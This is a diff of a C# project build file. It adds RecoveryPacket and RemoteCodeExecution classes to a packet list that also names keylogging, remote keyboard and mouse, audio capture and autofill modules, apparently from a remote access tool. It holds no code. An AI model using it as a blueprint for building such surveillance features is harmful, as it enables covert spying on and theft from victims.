@@ -48,11 +48,13 @@
     <Compile Include="PacketHeader.cs" />
     <Compile Include="Packet\AutofillPacket.cs" />
     <Compile Include="Packet\BaseIpPacket.cs" />
+    <Compile Include="Packet\RecoveryPacket.cs" />
     <Compile Include="Packet\RemoteChatPacket.cs" />
     <Compile Include="Packet\CryptographyPacket.cs" />
     <Compile Include="Packet\InformationPacket.cs" />
     <Compile Include="Packet\KeylogOfflinePacket.cs" />
     <Compile Include="Packet\KeywordsPacket.cs" />
+    <Compile Include="Packet\RemoteCodeExecution.cs" />
     <Compile Include="Packet\RemoteKeyboardPacket.cs" />
     <Compile Include="Packet\RemoteMousePacket.cs" />
     <Compile Include="Packet\RemoteAudioCapturePacket.cs" />
